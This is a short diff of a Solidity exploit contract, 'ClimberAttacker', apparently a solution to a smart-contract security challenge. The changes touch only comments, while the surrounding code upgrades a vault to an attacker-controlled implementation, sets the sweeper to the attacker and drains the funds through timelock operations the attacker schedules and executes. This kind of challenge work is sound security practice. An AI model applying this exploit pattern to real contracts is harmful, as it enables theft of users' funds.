@@ -59,14 +59,14 @@ contract ClimberAttacker {
             , abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(new VaultAttacker()))
         );
 
-        //6: I made the _setSweeper function public so that I can call it from here
+        //6: I made the _setSweeper function public so that I can set the sweeper to myself
         addOperation(
             vault
             , 0
             , abi.encodeWithSelector(VaultAttacker._setSweeper.selector, owner)
         );
 
-        //7: I can now call the sweep function to steal the funds
+        //7: I can now call the sweep function to steal the funds and send them to myself
         addOperation(
             vault
             , 0
@@ -74,6 +74,7 @@ contract ClimberAttacker {
         );
 
         scheduleOperations();
+        //because I'm the proposer, I can execute the operations right away
         executeOperations();
 
     }
